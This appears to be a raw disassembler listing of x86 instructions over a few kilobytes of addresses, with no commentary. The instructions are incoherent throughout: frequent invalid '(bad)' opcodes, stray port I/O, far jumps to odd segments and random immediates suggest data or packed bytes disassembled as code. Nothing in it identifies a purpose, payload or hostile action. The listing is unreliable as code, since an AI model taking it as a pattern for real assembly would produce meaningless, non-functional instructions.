  429efc:	xchg   ecx,eax
  429efd:	sbb    DWORD PTR [esi],esp
  429eff:	(bad)  
  429f01:	aad    0x61
  429f03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429f04:	pop    edi
  429f05:	add    BYTE PTR [ebx],dh
  429f07:	adc    esi,DWORD PTR [ebp+0x29]
  429f0a:	in     eax,0xe8
  429f0c:	ds jle 0x429eb1
  429f0f:	mov    bl,bl
  429f11:	stc    
  429f12:	inc    esp
  429f13:	jbe    0x429f6a
  429f15:	or     eax,0xee01a743
  429f1a:	push   edx
  429f1b:	xchg   esp,eax
  429f1c:	lock cmp eax,0xb51939fe
  429f22:	add    eax,0x1452c3da
  429f27:	cmp    DWORD PTR [eax+edx*2+0x39],ebp
  429f2b:	cmp    al,0x2
  429f2d:	icebp  
  429f2e:	sbb    dh,BYTE PTR [eax]
  429f30:	shr    DWORD PTR [esi-0x4996be67],1
  429f36:	scas   eax,DWORD PTR es:[edi]
  429f37:	loop   0x429ef8
  429f39:	adc    edi,edi
  429f3b:	in     eax,dx
  429f3c:	jb     0x429ef7
  429f3e:	or     ah,BYTE PTR [esi]
  429f40:	push   es
  429f41:	jecxz  0x429f43
	...
  429fb3:	add    cl,ah
  429fb5:	in     al,dx
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x52876d7b]
  429fc2:	inc    esp
  429fc3:	add    eax,edx
  429fc5:	mov    ebp,0xf60001
  429fca:	add    BYTE PTR [eax],al
  429fcc:	aas    
  429fcd:	sti    
  429fce:	(bad)  
  429fcf:	mov    dl,0xd2
  429fd1:	mov    ds:0x695b564e,al
  429fd6:	pushf  
  429fd7:	fldcw  WORD PTR [esp+edi*4-0x6f]
  429fdb:	jp     0x42a013
  429fdd:	pop    es
  429fde:	std    
  429fdf:	std    
  429fe0:	adc    BYTE PTR [edi+0x60f0c588],0x53
  429fe7:	mov    BYTE PTR [ebp-0x44],al
  429fea:	(bad)  
  429feb:	pop    eax
  429fec:	jns    0x42a05b
  429fee:	xchg   ebx,eax
  429fef:	ds inc eax
  429ff1:	mov    bh,0xe2
  429ff3:	icebp  
  429ff4:	and    eax,0x83051932
  429ff9:	mov    dl,0xa6
  429ffb:	cmp    eax,DWORD PTR [ecx]
  429ffd:	sbb    al,0xa3
  429fff:	addr16 xor eax,0x8872656c
  42a005:	jbe    0x42a004
  42a007:	push   edx
  42a008:	bound  edx,QWORD PTR [ebp-0x20c1f75a]
  42a00e:	jae    0x42a011
  42a010:	mov    ebx,0x539fc0d5
  42a015:	(bad)  
  42a016:	(bad)  
  42a017:	mov    dl,0x4b
  42a019:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a01a:	ret    0xd00f
  42a01d:	fiadd  WORD PTR [esi]
  42a01f:	dec    esi
  42a020:	adc    bh,BYTE PTR [edx+0x5f1ce812]
  42a026:	mov    al,ds:0xa9830d07
  42a02b:	test   DWORD PTR es:[edx+eiz*8-0x6bd14aa4],edi
  42a033:	push   es
  42a034:	ror    eax,0x73
  42a037:	mov    WORD PTR [ebx],?
  42a039:	xchg   ebp,eax
  42a03a:	or     DWORD PTR [edi-0x57d95e3e],ebp
  42a040:	nop
  42a041:	cmc    
  42a042:	and    al,0x54
  42a044:	sbb    al,0xa1
  42a046:	adc    al,0x2c
  42a048:	rcl    DWORD PTR [eax+ebp*4-0x3bcf8dfb],cl
  42a04f:	int3   
  42a050:	dec    ebp
  42a051:	retf   
  42a052:	cmovl  ebp,DWORD PTR [ebx-0x18d4c9e2]
  42a059:	add    al,0x7c
  42a05b:	or     ebx,ebx
  42a05d:	les    ecx,FWORD PTR [edx+0x2f3ae1d7]
  42a063:	fnsetpm(287 only) 
  42a065:	jae    0x42a03d
  42a067:	(bad)  
  42a068:	mov    bl,0x9f
  42a06a:	mov    eax,ds:0x8224be41
  42a06f:	neg    BYTE PTR [ecx+0x41]
  42a072:	cmp    al,bh
  42a074:	jmp    0x42a07d
  42a076:	xchg   ebp,eax
  42a077:	inc    eax
  42a078:	sbb    cl,cl
  42a07a:	sbb    DWORD PTR [ebx-0x2ba76ae7],edx
  42a080:	fisub  DWORD PTR [ecx+ebx*4]
  42a083:	clc    
  42a084:	in     eax,0xf3
  42a086:	push   ds
  42a087:	shl    BYTE PTR [esi-0x4d],1
  42a08a:	rcl    BYTE PTR ds:[edx],cl
  42a08d:	sbb    dh,BYTE PTR ds:[edx-0x38]
  42a091:	add    bl,dh
  42a093:	pusha  
  42a094:	test   eax,0x7fdf65a8
  42a099:	aaa    
  42a09a:	pushf  
  42a09b:	add    dh,BYTE PTR [edi-0x17]
  42a09e:	cmp    DWORD PTR [ebp+0x38],edx
  42a0a1:	out    dx,eax
  42a0a2:	inc    edi
  42a0a3:	sbb    DWORD PTR [eax+esi*8+0x2090ca04],edx
  42a0aa:	adc    al,BYTE PTR [edi+0x42]
  42a0ad:	xor    DWORD PTR [esi],0x70
  42a0b0:	jg     0x42a120
  42a0b2:	test   eax,0x45c29019
  42a0b7:	jmp    0xc497382b
  42a0bc:	sub    BYTE PTR [eax],ah
  42a0be:	pop    ebx
  42a0bf:	or     DWORD PTR [esi+0x76],eax
	...
  42a131:	add    BYTE PTR [eax],al
  42a133:	add    BYTE PTR [esi-0x79],dl
  42a136:	std    
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
  42a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a13f:	(bad)  
  42a140:	ds pop esi
  42a142:	xor    eax,0x1beb890
  42a147:	add    dh,dh
  42a149:	add    BYTE PTR [eax],al
  42a14b:	add    ah,bl
  42a14d:	add    esp,DWORD PTR [ecx]
  42a14f:	and    bh,BYTE PTR [ecx+ecx*1+0x4d]
  42a153:	cmp    BYTE PTR [edx-0x38],0x51
  42a157:	repz sub eax,0x39d77184
  42a15d:	dec    ecx
  42a15e:	popa   
  42a15f:	pop    edi
  42a160:	cwde   
  42a161:	mov    al,ds:0xb5dd4b1d
  42a166:	cmc    
  42a167:	mov    edx,0x67c39dda
  42a16c:	jns    0x42a174
  42a16e:	inc    edi
  42a16f:	push   edi
  42a170:	inc    esp
  42a171:	stos   BYTE PTR es:[edi],al
  42a172:	sub    esp,ecx
  42a174:	aad    0xe6
  42a176:	push   0x5186ed64
  42a17b:	or     eax,0x5d0c6cd0
  42a180:	xor    BYTE PTR [ebx+0x5a],0x3a
  42a184:	retf   0x6161
  42a187:	clc    
  42a188:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a189:	repnz retf 
  42a18b:	dec    edx
  42a18c:	cmc    
  42a18d:	outs   dx,DWORD PTR ds:[esi]
  42a18e:	dec    eax
  42a190:	inc    ebp
  42a191:	cmp    ah,BYTE PTR [ebx+0x1a]
  42a194:	call   0xf3d1:0xb67c2806
  42a19b:	cmp    edx,ecx
  42a19d:	pushf  
  42a19e:	(bad)  
  42a19f:	cwde   
  42a1a0:	lea    edi,ds:0xdffe36bf
  42a1a6:	pop    eax
  42a1a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a1a8:	or     al,0x7f
  42a1aa:	pop    esp
  42a1ab:	imul   ebp,DWORD PTR [eax-0x4b],0xdcd5b183
  42a1b2:	dec    esi
  42a1b3:	pop    edx
  42a1b4:	aam    0x91
  42a1b6:	jae    0x42a1b4
  42a1b8:	shl    BYTE PTR [ecx],1
  42a1ba:	jns    0x42a15c
  42a1bc:	jbe    0x42a1ed
  42a1be:	enter  0x45df,0xe6
  42a1c2:	out    dx,eax
  42a1c3:	mov    dh,0x37
  42a1c5:	in     eax,0x6e
  42a1c7:	into   
  42a1c8:	push   esi
  42a1c9:	sub    eax,0x2e92c5d3
  42a1ce:	sar    BYTE PTR [ecx-0x60292632],cl
  42a1d4:	mov    dl,0x8b
  42a1d6:	jns    0x42a198
  42a1d8:	jmp    0x584a:0xbd6fa337
  42a1df:	add    ch,BYTE PTR [esp+ebp*2]
  42a1e2:	push   ds
  42a1e3:	ds loop 0x42a256
  42a1e6:	dec    ebp
  42a1e7:	ror    DWORD PTR [edx],1
  42a1e9:	add    bh,BYTE PTR [ebx]
  42a1eb:	test   al,0x75
  42a1ed:	mov    ebx,0xfa1086de
  42a1f2:	pop    ds
  42a1f3:	inc    edx
  42a1f4:	adc    dh,BYTE PTR [esi-0xd]
  42a1f7:	and    DWORD PTR [edx+esi*4-0x3d],ebx
  42a1fb:	and    ebx,DWORD PTR [esi-0x43]
  42a1fe:	pop    DWORD PTR [edx-0x3a]
  42a201:	xor    esi,DWORD PTR ds:0xcf709abd
  42a207:	repz popa 
  42a209:	inc    ecx
  42a20a:	je     0x42a279
  42a20c:	inc    esp
  42a20d:	outs   dx,DWORD PTR ds:[esi]
  42a20e:	daa    
  42a20f:	dec    ebp
  42a210:	adc    DWORD PTR [ecx+0x5f829abf],ebp
  42a216:	or     BYTE PTR [ebp+0x3f],cl
  42a219:	dec    edx
  42a21a:	xor    DWORD PTR [edi-0x43884389],ebp
  42a220:	push   0xffffffd6
  42a222:	mov    ds,WORD PTR [esi]
  42a224:	xlat   BYTE PTR ds:[ebx]
  42a225:	adc    eax,0xa944e746
  42a22a:	lahf   
  42a22b:	xchg   ebp,eax
  42a22c:	(bad)  
  42a22d:	icebp  
  42a22e:	test   DWORD PTR [edi-0x643841d],0x3571625a
  42a238:	lods   al,BYTE PTR ds:[esi]
  42a239:	push   0x46
  42a23b:	pop    esi
  42a23c:	inc    esi
  42a23d:	dec    esp
  42a23e:	cmp    BYTE PTR [ebp+0xf90b],cl
	...
  42a2b4:	lock adc al,0xe1
  42a2b7:	(bad)  
  42a2b8:	in     eax,0xff
  42a2ba:	call   FWORD PTR [esi]
  42a2bc:	xor    eax,0x677f8ab9
  42a2c1:	and    DWORD PTR [ecx+ebx*1-0x52],esi
  42a2c5:	mov    edi,0xf60001
  42a2ca:	add    BYTE PTR [eax],al
  42a2cc:	enter  0xbaa8,0x63
  42a2d0:	pop    ebp
  42a2d1:	sbb    al,0x81
  42a2d3:	lods   eax,DWORD PTR ds:[esi]
  42a2d4:	std    
  42a2d5:	ds int3 
  42a2d7:	outs   dx,BYTE PTR ds:[esi]
  42a2d8:	xchg   edi,esp
  42a2da:	inc    ebx
  42a2db:	cld    
  42a2dc:	pop    edx
  42a2dd:	outs   dx,BYTE PTR ds:[esi]
  42a2de:	popf   
  42a2df:	idiv   DWORD PTR [ebp+ebx*8-0x2a]
  42a2e3:	iret   
  42a2e4:	jge    0x42a2ce
  42a2e6:	push   esp
  42a2e7:	loope  0x42a334
  42a2e9:	scas   eax,DWORD PTR es:[edi]
  42a2ea:	mov    ebp,ebx
  42a2ec:	bnd jp 0x42a322
  42a2ef:	and    al,0x31
  42a2f1:	mov    al,0x72
  42a2f3:	jmp    0xe505646a
  42a2f8:	mov    al,ds:0x44b6df5b
  42a2fd:	cwde   
  42a2fe:	or     BYTE PTR [eax-0x299bad19],0x87
  42a305:	cmp    BYTE PTR [eax-0x10461d59],cl
  42a30b:	mov    esi,0x176f96d5
  42a310:	xchg   edx,eax
  42a311:	jnp    0x42a297
  42a313:	cld    
  42a314:	adc    ch,BYTE PTR [ecx]
  42a316:	cmp    bl,BYTE PTR [edi-0x5d]
  42a319:	(bad)  
  42a31a:	in     al,0xa8
  42a31c:	(bad)
  42a31f:	xor    esp,DWORD PTR [edx+0xa]
  42a322:	stc    
  42a323:	cli    
  42a324:	xor    bl,BYTE PTR [esi]
  42a326:	out    dx,eax
  42a327:	ins    BYTE PTR es:[edi],dx
  42a328:	outs   dx,BYTE PTR ds:[esi]
  42a329:	lock xchg DWORD PTR [ecx],ebp
  42a32c:	(bad)  
  42a32d:	cmp    ecx,DWORD PTR [esi+ebp*8+0x1e350d74]
  42a334:	jo     0x42a337
  42a336:	add    dl,ch
  42a338:	push   ecx
  42a339:	in     al,dx
  42a33a:	addr16 sub eax,0xab3dbbc3
  42a340:	and    BYTE PTR [edx+0x17],dl
  42a343:	cmp    ah,al
  42a345:	in     eax,dx
  42a346:	adc    al,0xe6
  42a348:	cmp    BYTE PTR [edx+0x11],bh
  42a34b:	adc    esp,DWORD PTR [ebx]
  42a34d:	call   0x8bff5687
  42a352:	push   ebx
  42a353:	jo     0x42a34b
  42a355:	les    eax,FWORD PTR [ebp+edx*1+0xe9996d6]
  42a35c:	mov    cl,0x69
  42a35e:	fld    QWORD PTR [esi-0x4e]
  42a361:	(bad)  
  42a363:	test   BYTE PTR [ebx+eax*2],bh
  42a366:	xor    ecx,eax
  42a368:	or     eax,0x6ddaa692
  42a36d:	mov    al,ds:0x606fe23d
  42a372:	cmp    BYTE PTR [eax],0x1c
  42a375:	jg     0x42a3cc
  42a377:	jbe    0x42a368
  42a379:	inc    edi
  42a37a:	push   es
  42a37b:	push   esi
  42a37c:	mov    ebp,0x1e2ec503
  42a381:	and    cl,BYTE PTR [edx+0x5c]
  42a384:	add    al,0x94
  42a386:	xor    esi,DWORD PTR [edi+0x7321ac5]
  42a38c:	stos   DWORD PTR es:[edi],eax
  42a38d:	cdq    
  42a38e:	dec    edx
  42a38f:	mov    ebx,DWORD PTR [esi+0x77bedd58]
  42a395:	fst    QWORD PTR [ebx-0x71d68b01]
  42a39b:	jge    0x42a3b1
  42a39d:	ror    DWORD PTR [edx-0x386ba3a5],0x78
  42a3a4:	jae    0x42a36e
  42a3a6:	in     eax,0x39
  42a3a8:	loope  0x42a35f
  42a3aa:	mov    al,ds:0xdbe9e008
  42a3af:	outs   dx,BYTE PTR ds:[esi]
  42a3b0:	push   ebx
  42a3b1:	mov    cl,0x9a
  42a3b3:	or     eax,0xa22ecdf8
  42a3b8:	fidivr WORD PTR [ecx-0x37]
  42a3bb:	fsubr  QWORD PTR [ecx+0x7]
  42a3be:	cmp    esi,DWORD PTR [esi+0x63]
  42a3c1:	lea    eax,[eax]
	...
  42a433:	add    BYTE PTR [ebp+ecx*1+0x13],cl
  42a437:	sub    al,0x53
  42a439:	ds jg  0x42a4a9
  42a43c:	stos   BYTE PTR es:[edi],al
  42a43d:	dec    ebx
  42a43e:	push   edi
  42a43f:	jo     0x42a48b
  42a441:	rcl    DWORD PTR [ecx+0x23],0xa4
  42a445:	rol    BYTE PTR [ecx],0x0
  42a448:	test   BYTE PTR [eax],0x0
  42a44b:	add    BYTE PTR [ecx-0x402dc4c0],ch
  42a451:	ds jmp 0x42a46c
  42a454:	xor    al,BYTE PTR [edx-0x29]
  42a457:	les    ebp,FWORD PTR [ecx+0x76]
  42a45a:	bound  esi,QWORD PTR [esi]
  42a45c:	js     0x42a4ac
  42a45e:	(bad)  
  42a45f:	xor    eax,0x7564efd2
  42a464:	ficomp DWORD PTR [ecx+0x29]
  42a467:	aam    0x6
  42a469:	addr16 mov eax,0xf3612a9f
  42a46f:	sbb    al,BYTE PTR [ecx+0x31]
  42a472:	xor    dl,dh
  42a474:	popf   
  42a475:	cmp    DWORD PTR [esi+0x7ef3011a],eax
  42a47b:	jecxz  0x42a400
  42a47d:	lock int 0xfc
  42a480:	cld    
  42a481:	int3   
  42a482:	ins    DWORD PTR es:[edi],dx
  42a483:	fwait
  42a484:	in     eax,dx
  42a485:	arpl   WORD PTR [ecx],sp
  42a487:	into   
  42a488:	mov    bl,0xe5
  42a48a:	mov    dh,0x3f
  42a48c:	fxch   st(2)
  42a48e:	(bad)  
  42a48f:	jle    0x42a4d7
  42a491:	fiadd  DWORD PTR [edi-0x12]
  42a494:	in     al,dx
  42a495:	int    0xc6
  42a497:	dec    edi
  42a498:	cld    
  42a499:	jge    0x42a4f0
  42a49b:	cmp    DWORD PTR [ebp+0xef4c8d2],ebp
  42a4a1:	and    eax,0x3619307f
  42a4a6:	ss inc ebp
  42a4a8:	pop    ebx
  42a4a9:	popf   
  42a4aa:	fwait
  42a4ab:	popa   
  42a4ac:	mov    ecx,0xe25b099c
  42a4b1:	cmc    
  42a4b2:	retf   0xc5e
  42a4b5:	ret    
  42a4b6:	scas   eax,DWORD PTR es:[edi]
  42a4b7:	sbb    eax,0x57bac82f
  42a4bc:	mov    ch,0xc6
  42a4be:	mov    bl,ah
  42a4c0:	xor    al,0x32
  42a4c2:	sbb    al,0x5f
  42a4c4:	jle    0x42a4c0
  42a4c6:	or     ax,0xb3d7
  42a4ca:	push   eax
  42a4cb:	(bad)  
  42a4cc:	xor    bl,BYTE PTR [ecx-0x6]
  42a4cf:	jecxz  0x42a45d
  42a4d1:	ret    0x9147
  42a4d4:	addr16 popw ds
  42a4d7:	vpavgb xmm4,xmm5,XMMWORD PTR [edx-0x426bf581]
  42a4df:	jb     0x42a4ea
  42a4e1:	lock (bad) 
  42a4e3:	fs pop es
  42a4e5:	jb     0x42a4bb
  42a4e7:	dec    edi
  42a4e8:	pusha  
  42a4e9:	call   0xce98:0xa6a06382
  42a4f0:	popf   
  42a4f1:	adc    al,0x8c
  42a4f3:	or     dh,BYTE PTR [ecx]
  42a4f5:	jle    0x42a482
  42a4f7:	les    ecx,FWORD PTR [edx+edx*4+0x7a1d47bf]
  42a4fe:	fcmovne st,st(4)
  42a500:	and    bh,BYTE PTR [ecx+0x67201492]
  42a506:	jmp    0x70a98845
  42a50b:	sbb    DWORD PTR [edi-0x75],0xffffffdb
  42a50f:	jecxz  0x42a527
  42a511:	mov    BYTE PTR [esi-0x51ab2af3],0xdf
  42a518:	(bad)  
  42a519:	ror    DWORD PTR [esi-0x56],cl
  42a51c:	sub    eax,0x1f7651dc
  42a521:	jl     0x42a4f9
  42a523:	test   BYTE PTR [ebx-0x4],bl
  42a526:	sub    eax,0x9c6db181
  42a52b:	(bad)  [edi-0x1e]
  42a52e:	retf   0xe636
  42a531:	lock xchg esp,eax
  42a533:	inc    esi
  42a534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a535:	push   ecx
  42a536:	fist   DWORD PTR [ecx+0x1f67ce31]
  42a53c:	in     eax,0x7a
  42a53e:	int    0xbf
  42a540:	fiadd  DWORD PTR [eax+eax*1+0x0]
	...
  42a5b3:	add    BYTE PTR [ebp+0x1d],ch
  42a5b6:	out    0xc0,al
  42a5b8:	idiv   bl
  42a5ba:	outs   dx,DWORD PTR ds:[esi]
  42a5bb:	mov    ebp,0x44d94d2c
  42a5c0:	inc    ebp
  42a5c1:	sbb    ecx,DWORD PTR [ebp-0xa]
  42a5c4:	call   0x0:0xf60001c1
  42a5cb:	add    BYTE PTR [ecx],dh
  42a5cd:	sub    eax,0xfb808d31
  42a5d2:	mov    cl,0x23
  42a5d4:	fld    DWORD PTR [edx]
  42a5d6:	pop    esi
  42a5d7:	xchg   ebx,eax
  42a5d8:	xchg   ecx,eax
  42a5d9:	cmp    DWORD PTR [edx],edx
  42a5db:	je     0x42a5be
  42a5dd:	in     eax,0x5e
  42a5df:	aas    
  42a5e0:	mov    eax,ds:0x9529fba2
  42a5e5:	push   esi
  42a5e6:	xchg   ebx,eax
  42a5e7:	pop    ds
  42a5e8:	mov    al,0xa3
  42a5ea:	inc    ebx
  42a5eb:	pop    ds
  42a5ec:	push   edi
  42a5ed:	dec    esi
  42a5ef:	sbb    cl,BYTE PTR [ebp+0x123d118a]
  42a5f5:	and    BYTE PTR ds:0x661df6a8,0xf3
  42a5fc:	(bad)  
  42a5fd:	xchg   ebx,eax
  42a5fe:	push   cs
  42a5ff:	sbb    BYTE PTR [edi+ebx*4-0x7e],bh
  42a603:	retf   0x4c61
  42a606:	adc    al,0xaa
  42a608:	or     eax,0xd7a1d6a
  42a60d:	xlat   BYTE PTR ds:[ebx]
  42a60e:	mov    dh,0x54
  42a610:	(bad)  
  42a611:	pop    esp
  42a612:	push   0x58
  42a614:	pop    ebp
  42a615:	mov    dh,0x19
  42a617:	fwait
  42a618:	mov    ecx,0xcbed1cf9
  42a61d:	outs   dx,WORD PTR ds:[esi]
  42a61f:	out    0xad,eax
  42a621:	fs addr16 imul ebx,ecx,0x92f58f11
  42a629:	dec    edx
  42a62a:	add    al,0xe8
  42a62c:	mov    al,0x3e
  42a62e:	sub    DWORD PTR [eax-0x45a03a99],edi
  42a634:	adc    al,0x8b
  42a636:	test   edx,eax
  42a638:	jge    0x42a60d
  42a63a:	(bad)  
  42a63b:	ds out 0xd9,al
  42a63e:	jbe    0x42a5f0
  42a640:	mov    ds:0xfda60012,al
  42a645:	xchg   BYTE PTR [edi-0x68],bl
  42a648:	in     al,0x4b
  42a64a:	out    0x91,al
  42a64c:	neg    BYTE PTR [eax+0x3d7b1e8d]
  42a652:	popf   
  42a653:	bound  edx,QWORD PTR [ecx]
  42a655:	ja     0x42a671
  42a657:	xor    esi,esi
  42a659:	ds adc dh,ah
  42a65c:	inc    eax
  42a65d:	(bad)  
  42a65e:	sbb    ebx,DWORD PTR [edx]
  42a660:	pop    ss
  42a661:	add    cl,BYTE PTR [ecx+ebx*4-0x3c0c97d9]
  42a668:	les    edi,FWORD PTR ds:0xad9b6e14
  42a66e:	(bad)  
  42a66f:	jmp    0x42a683
  42a671:	xor    DWORD PTR [eax],ecx
  42a673:	pop    esi
  42a674:	push   eax
  42a675:	out    0xfb,eax
  42a677:	out    dx,eax
  42a678:	push   es
  42a679:	cmp    DWORD PTR [eax],esp
  42a67b:	lea    ecx,[ebx]
  42a67d:	jg     0x42a661
  42a67f:	jns    0x42a6c8
  42a681:	rcl    BYTE PTR [ebx+0x41],1
  42a684:	jno    0x42a607
  42a686:	(bad)  
  42a688:	jnp    0x42a68e
  42a68a:	(bad)  
  42a68c:	xor    al,0xd5
  42a68e:	js     0x42a649
  42a690:	clc    
  42a691:	cmp    ch,BYTE PTR [ebx-0x7af3f331]
  42a697:	jg     0x42a6d4
  42a699:	dec    esi
  42a69a:	repz push edx
  42a69c:	jae    0x42a63f
  42a69e:	arpl   WORD PTR [edi+0x56],bx
  42a6a1:	jl     0x42a64d
  42a6a3:	imul   ebp,DWORD PTR [ebp+0x58],0x56
  42a6a7:	mov    ds:0x3591a29f,al
  42a6ac:	lock in al,dx
  42a6ae:	and    DWORD PTR [edx+0x1c],esp
  42a6b1:	je     0x42a6d8
  42a6b3:	inc    ebx
  42a6b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a6b5:	cli    
  42a6b6:	lahf   
  42a6b7:	cmp    ah,BYTE PTR [ecx]
  42a6b9:	xor    BYTE PTR [eax],0x80
  42a6bc:	outs   dx,BYTE PTR ds:[esi]
  42a6bd:	pop    ebx
  42a6be:	mov    esp,0x825e12
	...
  42a733:	add    BYTE PTR [eax],dh
  42a735:	inc    edx
  42a736:	fbld   TBYTE PTR [edx-0x1]
  42a739:	(bad)  
  42a73a:	mov    ebp,0xffb84452
  42a73f:	cdq    
  42a740:	mov    bl,0xf4
  42a742:	fcom   QWORD PTR [esi]
  42a744:	nop
  42a745:	ret    0x1
  42a748:	test   BYTE PTR [eax],0x0
  42a74b:	add    BYTE PTR [edx+0x7c1ef8a],ch
  42a751:	fidiv  WORD PTR ds:0x4d8d0cbf
  42a757:	outs   dx,BYTE PTR ds:[esi]
  42a758:	mov    edi,0x3ba9a49f
  42a75d:	push   ebx
  42a75e:	ja     0x42a7cc
  42a760:	mov    al,ds:0x374b6acd
  42a765:	cmp    esp,DWORD PTR [edi-0x44e345ba]
  42a76b:	scas   al,BYTE PTR es:[edi]
  42a76c:	fs inc esi
  42a76e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a76f:	jge    0x42a772
  42a771:	das    
  42a772:	sbb    al,0x83
  42a774:	and    ebx,esp
  42a776:	fidivr WORD PTR ds:0xcc8b13ee
  42a77c:	repnz or eax,0xcb58adaa
  42a782:	fstp   QWORD PTR [eax-0x38]
  42a785:	data16 rol BYTE PTR [ecx+edx*8+0x62],1
  42a78a:	push   0x6
  42a78c:	popa   
  42a78d:	mov    esp,0xf9e6ba9f
  42a792:	lods   eax,DWORD PTR ds:[esi]
  42a793:	popf   
  42a794:	outs   dx,DWORD PTR ds:[esi]
  42a795:	mov    bl,0x97
  42a797:	dec    eax
  42a798:	aam    0xf4
  42a79a:	out    0x27,eax
  42a79c:	bound  edx,QWORD PTR ds:0xefd80b21
  42a7a2:	mov    esi,0xa6244c8c
  42a7a7:	mov    cl,0x89
  42a7a9:	imul   ebp,DWORD PTR [ebx-0x55],0x9c9d9a14
  42a7b0:	fisubr DWORD PTR [ecx-0x42]
  42a7b3:	stos   DWORD PTR es:[edi],eax
  42a7b4:	int3   
  42a7b5:	cmp    dl,ah
  42a7b7:	iret   
  42a7b8:	adc    ebx,DWORD PTR [ebp+ecx*8-0x6b]
  42a7bc:	mov    cl,0x9e
  42a7be:	dec    esi
  42a7c0:	or     DWORD PTR [ebx+0x13812dcc],ebx
  42a7c6:	enter  0x21c1,0xb1
  42a7ca:	push   cs
  42a7cb:	add    al,0x2b
  42a7cd:	in     al,0x77
  42a7cf:	sti    
  42a7d0:	lods   eax,DWORD PTR ds:[esi]
  42a7d1:	nop
  42a7d2:	push   ss
  42a7d3:	sub    esp,DWORD PTR [ecx-0x4b18f051]
  42a7d9:	rol    BYTE PTR [esi+0x72],0x3f
  42a7dd:	jb     0x42a7f5
  42a7df:	bound  edi,QWORD PTR [esi+0x5c01b7ab]
  42a7e5:	add    al,0x3e
  42a7e7:	mov    dl,0xc9
  42a7e9:	xor    DWORD PTR [esi+eax*8],esp
  42a7ec:	pop    esp
  42a7ed:	xchg   esp,eax
  42a7ee:	push   es
  42a7ef:	mov    bh,0xe0
  42a7f1:	fist   WORD PTR [eax+esi*8-0x79]
  42a7f5:	add    esp,edx
  42a7f7:	add    al,0xf2
  42a7f9:	xor    al,0x78
  42a7fb:	sbb    ah,BYTE PTR [edi]
  42a7fd:	xchg   edi,eax
  42a7fe:	jnp    0x42a87f
  42a800:	in     eax,0xfc
  42a802:	xchg   eax,ecx
  42a804:	lods   eax,DWORD PTR ds:[esi]
  42a805:	mov    esi,0x3e5583a5
  42a80a:	lds    eax,FWORD PTR [eax+0x472bfba4]
  42a810:	out    0xf1,eax
  42a812:	fistp  QWORD PTR [edx-0x43]
  42a815:	sti    
  42a816:	jne    0x42a7b2
  42a818:	loop   0x42a7c0
  42a81a:	int    0x5d
  42a81c:	out    0x9e,al
  42a81e:	mov    ch,0x73
  42a820:	push   esi
  42a821:	les    esi,FWORD PTR [edi-0x255aeaac]
  42a827:	mov    al,ds:0xae9bd86d
  42a82c:	(bad)  
  42a82d:	mov    ch,0xbc
  42a82f:	je     0x42a7dc
  42a831:	xor    al,0x9
  42a833:	int    0x9e
  42a835:	imul   ebx,DWORD PTR gs:[eax-0xf3c9416],0x889fcd11
  42a840:	mov    BYTE PTR [ebp+0x0],al
	...
  42a8b2:	add    BYTE PTR [eax],al
  42a8b4:	push   edi
  42a8b5:	push   0xdf7fdf64
  42a8ba:	(bad)  
  42a8bb:	call   0x123b0c10
  42a8c0:	loope  0x42a86f
  42a8c2:	dec    esp
  42a8c3:	hlt    
  42a8c4:	xchg   bl,al
  42a8c6:	add    DWORD PTR [eax],eax
  42a8c8:	test   BYTE PTR [eax],0x0
  42a8cb:	add    BYTE PTR [eax+edx*2-0x48],ch
  42a8cf:	in     eax,0x30
  42a8d1:	or     BYTE PTR [edx],ah
  42a8d3:	fwait
  42a8d4:	dec    ebx
  42a8d5:	adc    al,0xc9
  42a8d7:	cmp    al,0x3c
  42a8d9:	sbb    al,0x10
  42a8db:	cmp    BYTE PTR [eax],dl
  42a8dd:	bound  edi,QWORD PTR [esi]
  42a8df:	mov    ah,0x1e
  42a8e1:	outs   dx,DWORD PTR ds:[esi]
  42a8e2:	push   edi
  42a8e3:	cli    
  42a8e4:	cdq    
  42a8e5:	popa   
  42a8e6:	scas   al,BYTE PTR es:[edi]
  42a8e7:	push   edx
  42a8e8:	int3   
  42a8e9:	clc    
  42a8ea:	cdq    
  42a8eb:	ds push cs
  42a8ed:	mov    bh,0x85
  42a8ef:	cwde   
  42a8f0:	lahf   
  42a8f1:	popa   
  42a8f2:	push   ebx
  42a8f3:	mov    ?,WORD PTR [ebp-0x734dae34]
  42a8f9:	pop    ebx
  42a8fa:	push   eax
  42a8fb:	icebp  
  42a8fc:	mov    BYTE PTR ss:[edx-0x2b],dl
  42a900:	(bad)  
  42a901:	xchg   ebx,eax
  42a902:	fwait
  42a903:	lea    edi,ds:0xf4ba6c9b
  42a909:	sbb    BYTE PTR [esi],bh
  42a90b:	fcom   QWORD PTR [esi]
  42a90d:	imul   eax,DWORD PTR cs:[eax+0x68],0x21
  42a912:	add    dl,BYTE PTR [esi]
  42a914:	pop    es
  42a915:	stos   DWORD PTR es:[edi],eax
  42a916:	pop    ebx
  42a917:	push   esp
  42a918:	or     dh,BYTE PTR [edi+0xa]
  42a91b:	imul   edi,DWORD PTR [esi],0x6d1ae005
  42a921:	popf   
  42a922:	rcr    ebp,0x41
  42a925:	jno    0x42a8a9
  42a927:	pushf  
  42a928:	popa   
  42a929:	cwde   
  42a92a:	outs   dx,BYTE PTR ds:[esi]
  42a92b:	inc    edx
  42a92c:	fistp  DWORD PTR [ebp+0x69a2ddaf]
  42a932:	jmp    0x42a91a
  42a934:	cmp    edi,ebp
  42a936:	fcomip st,st(3)
  42a938:	retf   0x12ee
  42a93b:	fwait
  42a93c:	push   es
  42a93d:	adc    cl,dh
  42a93f:	mov    esi,?
  42a941:	jl     0x42a950
  42a943:	add    eax,0xc58ea79
  42a948:	pop    ecx
  42a949:	mov    ebp,0xc9a87b12
  42a94e:	add    dl,ch
  42a950:	mov    edx,0x316971e
  42a955:	push   edx
  42a956:	loopne 0x42a90b
  42a958:	adc    ecx,esi
